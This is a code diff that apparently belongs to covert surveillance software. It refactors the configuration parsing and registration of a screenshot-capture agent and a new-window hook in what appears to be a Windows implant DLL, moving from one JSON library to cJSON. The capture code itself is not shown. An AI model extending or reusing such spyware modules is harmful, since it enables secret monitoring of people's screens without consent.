@@ -1,13 +1,15 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/HM_IpcModule.h"
 #include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/config.h"
+
 #include "screenshot.h"
 
 void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
@@ -79,21 +81,17 @@ DWORD WINAPI PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD WINAPI PM_SnapShotInit(JSONObject elem)
+DWORD WINAPI PM_SnapShotInit(cJSON* elem)
 {
-	capture_only_window = (BOOL) elem[L"onlywindow"]->AsBool();
-	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
-		image_quality = SNAP_IMG_QUALITY_HI; 
-	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
-		image_quality = SNAP_IMG_QUALITY_MED;
-	} else { 
-		image_quality = SNAP_IMG_QUALITY_LOW;
-	}
+	cJSON* onlywindow = cJSON_GetObjectItem(elem, "onlywindow");
+	
+	image_quality = config_get_quality(elem);
+	capture_only_window = cJSON_IsTrue(onlywindow);
 	return 1;
 }
 
 void PM_SnapShotRegister()
 {
-	AM_MonitorRegister(L"screenshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
-	AM_MonitorRegister(L"new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
+	AM_MonitorRegister("screenshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
+	AM_MonitorRegister("new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
 }
